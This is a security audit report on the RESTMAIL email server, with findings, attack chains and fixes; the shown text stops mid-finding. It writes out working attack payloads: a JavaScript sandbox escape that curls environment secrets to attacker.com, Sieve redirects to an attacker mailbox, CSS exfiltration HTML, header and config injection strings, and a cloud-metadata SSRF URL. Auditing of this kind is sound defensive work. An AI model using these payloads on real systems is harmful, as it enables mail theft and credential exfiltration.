# RESTMAIL Security Review
**Date:** 2026-04-23
**Reviewer:** Claude Opus 4.7 (via 8 parallel specialist agents)
**Threat model:** External attacker seeking to steal or delete user data. Also considered: low-privilege authenticated user attempting to escalate privileges or access other users' data.
**Scope:** REST API (every HTTP endpoint), SMTP/IMAP/POP3 gateways, pipeline engine + filters (including JS sidecar), data persistence + crypto, webmail + admin frontends, docker-compose + infra, Postfix/Dovecot/dnsmasq container configs, CI/CD supply chain, JWT internals, account-linking concurrency, ACME client, logging.

> ⚠️ This is a research report, not a patch set. No code was changed. Every finding cites a file path; verify each before acting. Several findings depend on deployment configuration (env vars, reverse proxy, network topology) — severities assume a reasonable production deployment.

---

## Table of contents

1. [Executive summary](#1-executive-summary)
2. [Attack chains](#2-attack-chains)
3. [Critical findings](#3-critical-17)
4. [High findings](#4-high-24)
5. [Medium findings](#5-medium-27)
6. [Low / Info findings](#6-low--info-11)
7. [Per-endpoint authorization matrix](#7-per-endpoint-authorization-matrix)
8. [Remediation plan](#8-remediation-plan-with-verification-tests)
9. [Deployment hardening checklist](#9-deployment-hardening-checklist)
10. [References](#10-references)
11. [Methodology & caveats](#11-methodology--caveats)

---

## 1. Executive summary

The codebase has **reasonable structural security** (JWT auth, bcrypt cost 10, GORM parameterized queries, capability middleware exists, TLS enforced on most paths, connection limiter present). However, the review identified **17 Critical and 24 High-severity issues** that would let an external attacker or low-privilege insider steal email, forge messages, or take over the server.

### Overall posture: 🔴 Not ready for untrusted production

The most load-bearing problems cluster into five themes:

| Theme | Findings | Root cause |
|-------|----------|------------|
| **Unauthenticated mail ingress** | C-1, C-4 | `/restmail/*` endpoints accept anonymous input despite comments claiming cryptographic verification that doesn't exist in code |
| **Broken object authorization** | C-2, C-5, H-1, H-4, H-16, H-21 | Per-mailbox handlers sometimes forget `resolveMailboxID()`; admin routes use coarse `AdminOnly` without capability gating; unlinked accounts retain JWT access |
| **Untrusted code execution** | C-7, C-8, H-10 | JS "sandbox" is `vm.runInNewContext` (not isolated); webhook/duplicate filters accept arbitrary URLs; custom filter upload combined with non-sandbox = RCE |
| **Default secrets everywhere** | C-11, H-13 (Grafana, Postgres), M-? | `dev-secret-change-in-production`, `restmail:restmail`, `admin/admin123!@`, `password123` — all in git |
| **Fail-open security controls** | C-9, C-15, H-8, H-9 | rspamd/clamav verdicts trusted unsigned; DKIM silently falls back to plaintext; missing filter name silently skips; sidecar error → pass |

### Finding distribution

| Severity | Count | % |
|----------|-------|---|
| Critical | 17 | 22% |
| High | 24 | 31% |
| Medium | 27 | 35% |
| Low / Info | 11 | 14% |
| **Total** | **79** | 100% |

### CWE categories represented

Access control (CWE-22, 284, 285, 639) · Authentication (CWE-287, 306, 307, 522, 613, 640) · Cryptography (CWE-295, 325, 347) · Injection (CWE-74, 78, 93, 94, 113, 918) · XSS (CWE-79) · Misconfiguration (CWE-250, 276, 489, 552, 798) · Race conditions (CWE-362, 363) · Information disclosure (CWE-200, 204, 208, 532) · Trust boundary (CWE-345, 501, 1336)

### Fast-track remediation

Seven fixes under 1 hour each close the worst holes (see §8 Phase 0). Full Phase 0 plus Phase 1 (7–10 engineer-days) takes the stack from "absolutely not production-ready" to "production-ready for trusted users". Phase 2 (container hardening, proper JS sandbox, multi-tenant safety) is another 1–2 weeks.

---

## 2. Attack chains

Isolated findings are easier to dismiss ("who'd find that?"). These end-to-end walkthroughs chain real findings to show **how the server gets breached in practice**. Each chain requires only what's in the codebase today — no additional vulnerabilities assumed.

### Chain A — "Silent mass email theft" (JWT + 0 exploits)

**Prerequisite:** one authenticated account — self-signup, stolen creds, or a free webmail account on the server.

1. Call `GET /api/mailboxes?address=ceo@company.com` (C-4). Response: `{"exists":true}`. Script this across `admin@`, `finance@`, `hr@`, `legal@`, `it@` × every domain on the server.
2. For the target list, call `PUT /api/v1/accounts/<victim-id>/sieve` (C-2) with body:
   ```
   {"script":"redirect \"collector@attacker.com\";","active":true}
   ```
   The Sieve handler has **no ownership check** — victim's filter rules are overwritten.
3. Sieve's `redirect` action has no domain allowlist (C-3), so external redirection works.
4. From now on, every email to those mailboxes is silently copied to `collector@attacker.com`. Victims have no UI indication; they receive their mail normally.

**Time-to-exploit:** ~15 minutes of scripting. **Detection:** zero, unless Sieve writes are audited (they aren't). **Impact:** complete email archive theft across the entire server.

### Chain B — "Anonymous phishing cannon" (zero auth required)

**Prerequisite:** internet connectivity.

1. `POST /restmail/messages` (C-1) with JSON body:
   ```json
   {"from":"ceo@target.com","to":["cfo@target.com"],"subject":"Wire transfer approval",
    "body":"Please process $2.4M wire per attached instructions. — CEO"}
   ```
2. The handler's comment claims "verified via DKIM/SPF/DMARC". There is **no verification code**. The message lands in `cfo@target.com`'s inbox with a spoofed `From: ceo@target.com`.
3. If the target server has its own DKIM signing enabled on outbound via this server (misconfigured deployment), the bounce/reply from CFO arrives with legitimate DKIM signature, reinforcing the fraud.
4. Authentication-Results header is added **post-signing** (L-5) so even a downstream recipient looking at this header can be fooled.

**Time-to-exploit:** seconds. **Detection:** non-obvious unless admins run the Instant Mail Check security audit against their own server. **Impact:** CEO fraud, BEC (business email compromise) indistinguishable from the internal CEO's own mail.

### Chain C — "Single weak admin password → full server RCE"

**Prerequisite:** one admin account with any capability level (including `domains:read` only).

1. Phish, credential-stuff, or brute-force (H-2 — no rate limit, H-3 — timing leak) a single admin login.
2. `POST /api/v1/admin/admin-users` creates a new admin with `capabilities:["*"]`. `AdminOnly` middleware doesn't check the caller's capabilities (H-1). The limited admin now has superadmin.
3. As superadmin, `POST /api/v1/admin/filters` with a malicious JavaScript custom filter containing:
   ```js
   function filter(email) {
     const proc = (function(){}).constructor("return require('child_process')")();
     proc.execSync(`curl http://attacker.com/env?d=$(env | base64)`);
     return {action: "continue"};
   }
   ```
   `vm.runInNewContext` is not a sandbox (C-7) — this escapes to the Node runtime.
4. The filter runs in the JS sidecar container. It execs curl with the sidecar's environment, which includes DB credentials (default `restmail:restmail` per C-11, or the real prod credentials the operator thinks they hid) and `MASTER_KEY`.
5. With DB credentials, attacker connects to Postgres, runs `SELECT dkim_private_key FROM domains` and `SELECT body_text, body_html FROM messages LIMIT ALL`.
6. If DKIM keys were "encrypted": C-15 means any old records that predate encryption are plaintext, and decryption failures silently fall back to plaintext.
7. Cover tracks: `POST /api/v1/admin/test/reset` (C-13 — only gated by string match on `ENVIRONMENT`, which the operator may have misspelled as `prod`) wipes audit trails.

**Time-to-exploit:** 1–4 hours for the initial admin compromise, minutes for steps 2–7 once in. **Detection:** possible at step 2 (new admin user created) **if** that event is audit-logged and alerted; currently no admin-audit log exists.

### Chain D — "Zero-click webmail session exfiltration"

**Prerequisite:** send one email to a target.

1. Craft an HTML email body:
   ```html
   <style>
   @font-face { font-family:'leak'; src:url('https://attacker/f/'); unicode-range:U+0061; }
   /* …one @font-face per glyph range, each leaking whether that char is present in DOM… */
   </style>
   <div style="font-family:'leak'; background:url('https://attacker/b?r='+document.location)">
     <!-- attacker renders DOM content they want to leak inside this div -->
   </div>
   ```
2. DOMPurify strips `<script>` and `onerror`, but `style` is in `ALLOWED_ATTR` (C-16) → the CSS and the inline `style` both survive.
3. Victim opens the email in webmail. Email body renders in the main webmail origin (L-2 — no iframe isolation).
4. The `background: url(...)` fires a GET to attacker.com with document location info.
5. The `@font-face` CSS pattern performs attribute-selector-driven exfiltration: for each character range, the browser loads the font file only if a matching character is present in the styled DOM subtree. Attacker logs reveal which characters exist in the attacker-controlled div and — via selector chains — in surrounding webmail DOM.

**Time-to-exploit:** 1 email. **Detection:** victim has no indication; admins can see only outbound CSS/font requests if browser traffic is proxied.

### Chain E — "RESTMAIL capability cache hijack" (mid-sophistication)

**Prerequisite:** attacker controls an MX for at least one domain they legitimately own.

1. Attacker publishes in their EHLO response: `250-RESTMAIL https://attacker.com/deliver`
2. RESTMAIL's outbound queue worker, on first delivery to attacker's domain, caches this URL keyed by recipient domain (agent finding on cache key — H-20).
3. If the cache is keyed poorly (by recipient domain alone, not by sender+MX+TLS cert), or if a same-host multi-tenant relay is in use, attacker's URL entry can overlap with legitimate domains' cache entries.
4. Subsequent deliveries route through the attacker's URL rather than real SMTP, delivering every outbound message destined for affected domains into attacker's hands — including DKIM-signed messages they can now read and replay.

**Time-to-exploit:** depends on deployment topology; risk exists anywhere the cache is used without strict per-peer identity binding.

---

## 3. Critical (17)

### C-1. `POST /restmail/messages` accepts unauthenticated messages from any sender
**CWE:** CWE-306 (Missing Authentication) · CWE-345 (Insufficient Verification of Data Authenticity)
**Location:** [internal/api/handlers/restmail.go:66-142](../internal/api/handlers/restmail.go#L66), routed in [internal/api/routes.go:161](../internal/api/routes.go#L161)
**What:** Endpoint is unauthenticated. Handler comment says "verified via DKIM/SPF/DMARC" but there is no verification code — request body (`from`, `to`, raw message) is passed directly into the pipeline for delivery.
**Attack:** Attacker spins up any host and POSTs `{"from":"ceo@company.com","to":["victim@company.com"],...}` → server stores the message in victim's inbox with spoofed `From`. Direct CEO fraud / BEC.
**Fix:** Implement one or more of: (a) DKIM signature verification against sender's published DKIM pubkey before acceptance; (b) mTLS with pinned CA between RESTMAIL peers; (c) shared-secret HMAC header signed with per-peer keys. Until any of these lands, disable the endpoint or restrict via reverse proxy to a known-peer allowlist.
**Detection:** Alert on any POST to `/restmail/messages` that isn't from a known peer IP. Audit-log every acceptance with sender domain + source IP.

### C-2. Sieve filter endpoints have no ownership check (IDOR)
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key) · OWASP A01
**Location:** [internal/api/handlers/sieve.go:27](../internal/api/handlers/sieve.go#L27) (`GET`), [:50](../internal/api/handlers/sieve.go#L50) (`PUT`), [:112](../internal/api/handlers/sieve.go#L112) (`DELETE`)
**What:** All three handlers take `{id}` from the URL path and use it as `mailbox_id` with no call to `resolveMailboxID()` (the helper every other per-mailbox handler uses).
**Attack:** User A sends `PUT /api/v1/accounts/42/sieve` with `redirect` script — user 42's Sieve rules are overwritten. Iterate IDs for silent mail forwarding server-wide. See Chain A.
**Fix:** Add `mailboxID, err := h.resolveMailboxID(r, chi.URLParam(r, "id"))` at handler entry, matching `ContactHandler`/`VacationHandler`.
**Detection:** Alert on any PUT/DELETE to `/sieve` where the mailbox in the URL isn't linked to the JWT's account.

### C-3. Sieve `redirect` action has no recipient domain validation
**CWE:** CWE-601 (Open Redirect — applied to mail domain)
**Location:** [internal/pipeline/filters/sieve.go:674-676, :116-122](../internal/pipeline/filters/sieve.go#L674)
**What:** `redirect` stores target address in metadata with no allowlist, no admin approval, no confirmation flow.
**Attack:** Combined with C-2: silent mail theft. Even without C-2, a malicious/compromised mailbox owner exfiltrates every received message.
**Fix:** Require targets within the user's own domain unless admin-approved. Log every redirect install. Send confirmation to the redirect address before enabling. Cap redirects per mailbox.
**Detection:** Log + alert on all Sieve redirect-to-external-domain installs.

### C-4. `/api/mailboxes?address=` and `/restmail/mailboxes?address=` enumerate valid emails
**CWE:** CWE-204 (Observable Response Discrepancy) · CWE-200 (Information Exposure)
**Location:** [internal/api/handlers/mailboxes.go:211](../internal/api/handlers/mailboxes.go#L211); [internal/api/handlers/restmail.go:45](../internal/api/handlers/restmail.go#L45)
**What:** Unauthenticated endpoints returning `{"exists": true|false}`.
**Attack:** Scripted enumeration of common role accounts across all domains; input for phishing campaigns and password spraying.
**Fix:** Move recipient verification into SMTP `RCPT TO` only (already rate-limited there). Remove or JWT-gate the HTTP endpoints.
**Detection:** Alert on repeated requests to these endpoints from a single source IP.

### C-5. `IsAdmin` flag self-escalation path
**CWE:** CWE-269 (Improper Privilege Management)
**Location:** [internal/api/handlers/auth.go:137-165](../internal/api/handlers/auth.go#L137)
**What:** JWT copies `account.IsAdmin` into claims. `IsAdmin` is a mutable boolean on `WebmailAccount`. `AdminOnly` middleware accepts `claims.UserType == "admin" OR claims.IsAdmin`.
**Attack:** Any path that lets a user update their own `WebmailAccount` (mass-assignment, field oversight) can flip `IsAdmin`. Next login becomes admin.
**Fix:** Remove `IsAdmin` from `WebmailAccount` (already marked deprecated in code). Mailbox users should never carry admin claims. Update `AdminOnly` to check only `UserType=="admin"`.
**Detection:** Audit-log every change to `webmail_accounts.is_admin` (should be zero changes post-fix). Alert on non-zero.

### C-6. Refresh tokens not rotated on use; no revocation on logout
**CWE:** CWE-613 (Insufficient Session Expiration) · CWE-384 (Session Fixation)
**Location:** [internal/api/handlers/auth.go:219](../internal/api/handlers/auth.go#L219)
**What:** Refresh endpoint issues new access but leaves old refresh valid. No revocation table. Logout deletes cookie client-side only. Each refresh adds 7 days.
**Attack:** Stolen refresh cookie → indefinite access. Password change has no effect.
**Fix:** Rotate refresh tokens on every call; persist `revoked_tokens(jti, expires_at)`. Reject replayed `jti`. Logout inserts current `jti`. Password change revokes all refresh tokens for that user.
**Detection:** Log every refresh. Alert when same `jti` is seen twice (replay = stolen).

### C-7. JavaScript filter sandbox is not a security boundary
**CWE:** CWE-693 (Protection Mechanism Failure) · CWE-501 (Trust Boundary Violation) · CWE-1336
**Location:** [docker/js-filter-sidecar/server.js:119-132](../docker/js-filter-sidecar/server.js#L119), driver at [internal/pipeline/filters/javascript.go:34-56](../internal/pipeline/filters/javascript.go#L34)
**What:** Sidecar uses Node.js `vm.runInNewContext()` with whitelisted globals. Node docs explicitly state this is **not a sandbox**. `(function(){}).constructor("return process")()` escapes; `Object.prototype` is mutable (`Object.freeze` not applied); prototype pollution escapes are trivial.
**Attack:** Admin uploads malicious custom JavaScript filter (H-10) → RCE in sidecar → env vars (DB creds, `MASTER_KEY`) → pivots. See Chain C.
**Fix:** Abandon `vm.runInNewContext`. Use `isolated-vm` (V8 isolates with memory + CPU caps), Firecracker microVMs, WebAssembly, or remove user-defined JavaScript filters entirely. Harden container: read-only FS, drop all capabilities, no egress except to API, non-root user, seccomp restricting `execve`.
**Detection:** Monitor sidecar outbound connections (should be ~zero). Alert on any connection from sidecar to the internet or internal non-API services.

### C-8. Webhook filter has no URL allowlist — SSRF
**CWE:** CWE-918 (Server-Side Request Forgery) · OWASP A10
**Location:** [internal/pipeline/filters/webhook.go:30-40, :45-121](../internal/pipeline/filters/webhook.go#L30); [internal/pipeline/filters/duplicate.go:38-82](../internal/pipeline/filters/duplicate.go#L38)
**What:** Both filters POST to arbitrary configured URL with no validation.
**Attack:** Admin (or compromised admin) points webhook at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → server exfiltrates AWS credentials. Or `http://localhost:8080/api/v1/admin/admin-users` to bypass network-level admin gates. `file://`, `gopher://` if not blocked.
**Fix:** Deny-by-default: allowlist of permitted URL patterns, validated with URL parser (not string matching). Block reserved ranges (127.0.0.0/8, ::1, 169.254.0.0/16, RFC1918, link-local) after DNS resolution. Deny non-`http(s)`. Cap response size/timeout. No redirect following (or re-validate each hop).
**Detection:** Log every webhook invocation with URL. Alert on any webhook to RFC1918 / 127.x / 169.254.x.

### C-9. rspamd/ClamAV adapters trust unsigned HTTP responses
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity) · CWE-295
**Location:** [internal/pipeline/filters/rspamd.go:98-183](../internal/pipeline/filters/rspamd.go#L98), [internal/pipeline/filters/clamav.go:88-155](../internal/pipeline/filters/clamav.go#L88), [internal/pipeline/filters/adapter.go:19-75](../internal/pipeline/filters/adapter.go#L19)
**What:** Adapters POST to configured URL, parse JSON verdict. No mTLS, no signature, no cert pinning. `fallback_action: continue` means transient unreachability silently passes.
**Attack:** Attacker with L2 network access (compromised sidecar container, rogue VM in same VPC, ARP poisoning, DNS hijack) returns `{"action":"no action","score":0}` — malware is delivered as "clean". Or DoS the real scanner and let `fallback_action: continue` ship everything.
**Fix:** mTLS with pinned peer cert between mail-server and scanner, OR HMAC-sign responses with pre-shared key, OR run scanners as network-namespace sidecars (no L2 exposure). Change default `fallback_action` to `defer`.
**Detection:** Track scanner verdict distribution; alert on sudden drop in spam/virus detection rate.

### C-10. dnsmasq provider writes unescaped user input to config file
**CWE:** CWE-74 (Injection) · CWE-78
**Location:** [internal/dns/dnsmasq.go:25-56](../internal/dns/dnsmasq.go#L25)
**What:** `fmt.Sprintf("address=/%s/%s", r.Name, r.Value)` with no validation; dnsmasq config is line-oriented.
**Attack:** Domain name `evil.com\nlisten-address=0.0.0.0` injects a second directive → dnsmasq binds publicly, becomes open resolver, enables DNS amplification. Or `server=/bank.com/1.2.3.4` redirects queries of arbitrary domains.
**Fix:** Validate names against `^[a-z0-9][a-z0-9.-]{0,252}[a-z0-9]$` and explicit reject `\r\n=#`. Ideally invoke dnsmasq via its API/scripts with structured args.
**Detection:** dnsmasq config file should only contain expected directives — monitor with integrity check on every write.

### C-11. Hardcoded default secrets baked into repo
**CWE:** CWE-798 (Use of Hard-coded Credentials) · CWE-532 (Sensitive Info in Log)
**Locations:**
- `.env` and [docker-compose.yml:131-132](../docker-compose.yml#L131) — `JWT_SECRET`, `MASTER_KEY`
- [docker-compose.yml:40-43, :62-64, :82-84](../docker-compose.yml#L40) — Postgres `restmail:restmail` ×3
- [monitoring/docker-compose.yml:27-28, :42](../monitoring/docker-compose.yml#L27) — Grafana `admin:restmail`, Postgres exporter DSN with password + `sslmode=disable`
- [internal/config/config.go:91-125](../internal/config/config.go#L91) — default value + string-match production check
**What:** Secrets in git history, publicly discoverable. `MASTER_KEY` guards DKIM + TLS private keys — its compromise unlocks every domain's signing key.
**Attack:** Repo scrape → forge JWTs, decrypt DKIM keys, sign phishing as any managed domain. Postgres default creds + any container escape = full DB takeover.
**Fix:** Remove every secret from tracked files. Ship `.env.example` with placeholder values. Startup must fail if any critical secret is unset, equals legacy default, or shorter than 32 bytes. Use Docker secrets / K8s Secrets / Vault in production. Postgres exporter DSN must use `sslmode=require` + unique password.
**Detection:** Startup log should show which secrets are "custom" without revealing them. CI linter should block any PR containing secrets.

### C-12. Attachment `Content-Disposition` header concatenates filename (CRLF injection)
**CWE:** CWE-93 (CRLF Injection) · CWE-113 (HTTP Response Splitting)
**Location:** [internal/api/handlers/attachments.go:86](../internal/api/handlers/attachments.go#L86)
**What:** `w.Header().Set("Content-Disposition", "attachment; filename=\""+att.Filename+"\"")`. `sanitizeFilename()` at [internal/mime/parser.go:171](../internal/mime/parser.go#L171) strips `/`, `\`, null — but not `\r\n`.
**Attack:** Attachment with filename containing MIME-encoded `\r\nContent-Type: text/html\r\n\r\n<script>…</script>` → browser interprets injected `Content-Type` → JS executes in webmail origin → session theft.
**Fix:** Reject filenames containing any control character. Use RFC 6266 `filename*=UTF-8''<pct-encoded>`.
**Detection:** Log + reject any attachment with `\r` or `\n` in filename at ingestion time as well.

### C-13. Test endpoints gated only by string match on `ENVIRONMENT == "production"`
**CWE:** CWE-489 (Active Debug Code) · CWE-269
**Location:** [internal/api/handlers/testing.go:35-38, :252-293](../internal/api/handlers/testing.go#L35), [internal/api/routes.go:364-367](../internal/api/routes.go#L364)
**What:** `if cfg.Environment == "production"` — typos (`prod`, `PROD`, `production-eu`) disable the gate. Within the gate, any admin with any capability (H-1) can wipe the DB.
**Attack:** Env typo → `/api/v1/admin/test/reset` truncates domains, mailboxes, messages. `/snapshot/restore` rolls DB back to attacker-chosen state.
**Fix:** Build-tag-gate test handlers (`//go:build !production`); do not compile into prod binaries. If runtime gate stays, require TWO signals: `ENVIRONMENT != "production"` (case-insensitive allowlist) AND `ENABLE_TEST_ENDPOINTS=yes`.
**Detection:** Alert on any call to `/api/v1/admin/test/*` in production logs.

### C-14. Attachment dedup uses checksum alone; cross-user file linking
**CWE:** CWE-639 · CWE-345
**Location:** [internal/pipeline/filters/extract_attachments.go:115-154](../internal/pipeline/filters/extract_attachments.go#L115)
**What:** `SELECT storage_ref FROM attachments WHERE checksum = ? AND storage_type = ?` — attacker with a known checksum reuses storage_ref.
**Attack:** Leaked checksum (log, metric, backup, coworker device) becomes a handle to re-attach the file in attacker's own message and retrieve it via normal attachment download.
**Fix:** Scope dedup per-mailbox: `WHERE checksum = ? AND message_id IN (SELECT id FROM messages WHERE mailbox_id = ?)`. Or verify content on retrieval (`sha256(read) == stored`). Or per-tenant salted `HMAC(salt, content)`.
**Detection:** Audit attachment dedup reuses across mailbox boundaries.

### C-15. DKIM private keys silently fall back to plaintext on decryption failure
**CWE:** CWE-325 (Missing Cryptographic Step) · CWE-311
**Location:** [internal/pipeline/filters/dkim.go:131-154](../internal/pipeline/filters/dkim.go#L131)
**What:** If `MASTER_KEY` empty OR `DecryptString` errors, code uses `domain.DKIMPrivateKey` as-is. Comment: "Fall back to plaintext in case key was stored before encryption was enabled."
**Attack:** Any DB exposure path (backup leak, replica read, logs) exposes signing keys if operator ever misconfigured `MASTER_KEY` — attacker signs phishing as any managed domain with legitimate DKIM passing.
**Fix:** Remove silent fallback. If `MASTER_KEY` unset at startup, refuse to start. If decryption fails, log + refuse to sign.
**Detection:** Log every DKIM decryption failure at ERROR level. Alert on >0/day.

### C-16. Webmail DOMPurify allows `style` attribute — CSS exfiltration
**CWE:** CWE-79 (XSS) · OWASP A03
**Location:** [webmail/src/components/mail/MessageViewer.tsx:401-411](../webmail/src/components/mail/MessageViewer.tsx#L401)
**What:** `ALLOWED_ATTR` includes `style` and `class`. DOMPurify strips JS but not CSS.
**Attack:** `<div style="background: url('https://evil/?leak=' + ...)">` exfiltrates session data via HTTP request from webmail origin. More aggressive: `@font-face` attribute-selector character-by-character exfiltration. See Chain D.
**Fix:** Drop `style` and `class` from `ALLOWED_ATTR`. Render email HTML inside sandboxed iframe (`sandbox="allow-popups"` without `allow-scripts`, restrictive CSP). Block external images by default with "Show images" button.
**Detection:** Browser CSP violation reports if CSP is added first.

### C-17. Postfix/Dovecot/Nginx containers run as root
**CWE:** CWE-250 (Execution with Unnecessary Privileges) · OWASP A05
**Location:** [docker/postfix/Dockerfile](../docker/postfix/Dockerfile), [docker/dovecot/Dockerfile](../docker/dovecot/Dockerfile), [admin/Dockerfile](../admin/Dockerfile), [webmail/Dockerfile](../webmail/Dockerfile) — no `USER` directive
**What:** Containers run as root. Combined with a Postfix/Dovecot/Nginx parsing RCE (historically common) → immediate root inside container → read `/certs/*`, env vars, pivot across the mailnet.
**Attack:** Any RCE in Postfix header parser, Dovecot IMAP literal handling, or nginx location dispatcher becomes full container compromise with access to volumes (certs, attachments) and network segmentation's only-barrier crossing (C-fail M-10).
**Fix:** Add `USER postfix` / `USER dovecot` / `USER nginx` after `RUN` steps. Postfix's chroot handles privileges internally but the supervisor should not be root. Ensure volume ownership matches the user.
**Detection:** `docker exec <container> id` returning `uid=0` in production = misconfiguration.

---

## 4. High (24)

### H-1. `/api/v1/admin/*` routes gated by `AdminOnly` but no capability check
**CWE:** CWE-285 (Improper Authorization) · CWE-269
**Location:** [internal/api/routes.go:247-349](../internal/api/routes.go#L247)
**What:** `RequireCapability` middleware exists at [internal/api/middleware/auth.go:74-106](../internal/api/middleware/auth.go#L74) but isn't applied per route.
**Attack:** Admin with only `domains:read` can still `POST /api/v1/admin/admin-users` (make a `*` superadmin), `DELETE /api/v1/admin/mailboxes/*`, `POST /api/v1/admin/test/reset`. See Chain C.
**Fix:** Add `RequireCapability("<action>:<resource>")` per route. Audit every admin handler for defense-in-depth: handler itself checks capabilities from `middleware.GetClaims(r)`.
**Detection:** Audit log every admin action with `actor`, `capability_exercised`. Alert on "admin used capability not in their granted set".

### H-2. No rate limiting on `/api/v1/auth/login`
**CWE:** CWE-307 · OWASP A07
**Location:** [internal/api/routes.go:146](../internal/api/routes.go#L146)
**What:** No per-IP, per-account, or global rate limit on login. Connection limiter is gateway-only.
**Attack:** Combined with C-4: build target list + credential-stuff known breach corpus or password-spray `Password2026!`.
**Fix:** Token-bucket per `(src_ip, email)` + per-`src_ip` cap. 429 after N failures in M minutes; optional CAPTCHA. Account lockout for long-term abuse.
**Detection:** Alert on >N failed logins per IP per minute.

### H-3. Login timing leak — user enumeration
**CWE:** CWE-208 (Observable Timing Discrepancy) · CWE-204
**Location:** [internal/api/handlers/auth.go:137-149](../internal/api/handlers/auth.go#L137)
**What:** "No such user" early-returns in ~10 ms. Password-mismatch runs bcrypt in ~70 ms. Diff trivially measurable.
**Fix:** Always run bcrypt against a precomputed dummy hash when mailbox not found. Constant-time branch.
**Detection:** Hard to detect attacks; mitigated by H-2 rate limit.

### H-4. IMAP folder names not server-validated — potential traversal
**CWE:** CWE-22 (Path Traversal)
**Location:** [internal/gateway/imap/session.go:307-355](../internal/gateway/imap/session.go#L307)
**What:** Gateway passes folder name to API without sanitization. If API doesn't enforce account_id filter strictly, attacker reads foreign folders.
**Fix:** Gateway whitelist `[A-Za-z0-9_ /]`, no `..`, length cap. API must always filter by authenticated account.
**Detection:** Alert on SELECT/LIST commands containing `..` or unusual characters.

### H-5. MIME header RFC 2047 decode without CRLF rejection
**CWE:** CWE-93
**Location:** [internal/mime/parser.go:49-101, :259-266](../internal/mime/parser.go#L49)
**What:** `mime.WordDecoder.DecodeHeader` output is not CRLF-checked; decoded Subject could be `ok\nBcc: attacker@`.
**Attack:** If decoded Subject is re-serialized into outgoing mail (forward, reply, bounce, Sieve action), CRLF injects Bcc/To headers that copy mail to attacker.
**Fix:** Reject or strip values containing `\r` or `\n` after decoding, on every header.
**Detection:** Log + reject messages with control chars in headers.

### H-6. SMTP bounce-loop / mail bombing via spoofed sender
**CWE:** CWE-400 (Uncontrolled Resource Consumption)
**Location:** [internal/gateway/queue/worker.go:458-573](../internal/gateway/queue/worker.go#L458)
**What:** DSN inserted into sender mailbox with no check that sender was the authenticated user.
**Fix:** Verify bounce recipient matches the session's authenticated account. Rate-limit DSNs per recipient.
**Detection:** Alert on >N DSNs to a single mailbox per hour.

### H-7. SMTP line-ending handling (SMTP smuggling adjacency)
**CWE:** CWE-74 · CVE-2023-51766 class
**Location:** [internal/gateway/smtp/session.go:413-442](../internal/gateway/smtp/session.go#L413)
**What:** DATA phase reads with `ReadBytes('\n')` trimming `\r\n`. Non-strict `\r\n` enforcement enables ambiguous end-of-data → smuggled second message.
**Fix:** Require `\r\n` explicitly. Reject `\n` not preceded by `\r`. Reject bare `\r`. Audit Postfix config too.
**Detection:** Log + reject any DATA with non-CRLF line endings.

### H-8. Pipeline filter name typo → silent skip → filter bypass
**CWE:** CWE-391 (Unchecked Error Condition)
**Location:** [internal/pipeline/engine.go:82-90](../internal/pipeline/engine.go#L82)
**What:** Unknown filter name logged + `continue`. Message proceeds unfiltered.
**Attack:** Mutate `rspamd` → `rspamd_` in DB (via SQLi, misconfig, compromised admin) → spam/virus scan bypassed.
**Fix:** Validate filter names at pipeline save time (reject unknown). At runtime, unknown filter = `defer` or `reject` per config (default fail-closed).
**Detection:** Alert on "failed to create filter" logs.

### H-9. Sidecar hardcoded URL + silent fail-open
**CWE:** CWE-755 · CWE-345
**Location:** [internal/pipeline/filters/javascript.go:16, :87, :454](../internal/pipeline/filters/javascript.go#L16)
**What:** URL `http://js-filter:3100` hardcoded, plaintext. Unreachable sidecar → `ActionContinue`.
**Fix:** Configurable URL + mTLS with pinned cert. Change default to `defer` or `reject` on error. Boot-time health check gates message acceptance.
**Detection:** Alert if sidecar health check fails; message queue should drain not accept new inbound until restored.

### H-10. Custom filter upload grants RCE via JS sidecar
**CWE:** CWE-94 (Code Injection)
**Location:** [internal/api/handlers/pipeline.go](../internal/api/handlers/pipeline.go) — `/api/v1/admin/filters` CRUD
**What:** Admin uploads JS filter body → runs in sidecar. Combined with C-7, any admin = RCE.
**Fix:** Close C-7 (proper sandbox). Interim: require code-signing on uploaded filters (only code signed by trusted key runs). Gate uploads behind dedicated `filters:execute` capability granted to few. Audit-log every upload with code SHA-256.
**Detection:** Alert on any POST/PUT to `/api/v1/admin/filters` containing inline code.

### H-11. Admin UI reachable from internet with only login as gate
**CWE:** CWE-284 · OWASP A01
**Location:** reverse-proxy config + [internal/api/routes.go:247](../internal/api/routes.go#L247)
**What:** `/admin` and `/api/v1/admin/*` exposed wherever the proxy listens. No IP allowlist, VPN, or 2FA.
**Fix:** Gate at reverse proxy by IP allowlist or VPN. Require WebAuthn/TOTP as second factor for all admin logins.
**Detection:** Alert on admin login from a new source IP.

### H-12. Prometheus `/metrics` endpoint unauthenticated
**CWE:** CWE-200 · CWE-552
**Location:** [internal/api/routes.go:116](../internal/api/routes.go#L116)
**What:** Top-level unauth'd `promhttp.Handler()`.
**Attack:** Labels may include emails, mailbox IDs, domains = PII. Counters reveal traffic patterns, internal hostnames, cert expiry timings.
**Fix:** JWT-gate or restrict via reverse proxy to monitoring CIDR. Scrub PII from metric labels.
**Detection:** Log all `/metrics` requests in prod.

### H-13. Security headers missing on API + frontends
**CWE:** CWE-1021 · CWE-346
**Location:** [internal/api/routes.go](../internal/api/routes.go), [webmail/nginx.conf](../webmail/nginx.conf), [admin/Dockerfile:22-29](../admin/Dockerfile#L22)
**What:** No HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.
**Fix:** chi middleware on API; `add_header … always;` in nginx configs. Restrictive CSP: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;`.
**Detection:** External scanner (SSL Labs, securityheaders.com) confirms headers.

### H-14. POP3 USER command enables blind enumeration
**CWE:** CWE-204 · CWE-208
**Location:** [internal/gateway/pop3/session.go:160-175](../internal/gateway/pop3/session.go#L160)
**Fix:** Always run bcrypt; constant-time identical error; fixed delay regardless of outcome.

### H-15. Quota increment missing upper bound
**CWE:** CWE-190 (Integer Overflow or Wraparound)
**Location:** [internal/api/handlers/messages.go](../internal/api/handlers/messages.go)
**Fix:** `LEAST(quota_used_bytes + ?, quota_bytes)` on increment, or `SELECT FOR UPDATE` in a transaction. Application-level single-message max size far below overflow risk.

### H-16. IMAP DELETE/EXPUNGE trusts gateway-cached message list for ownership
**CWE:** CWE-639
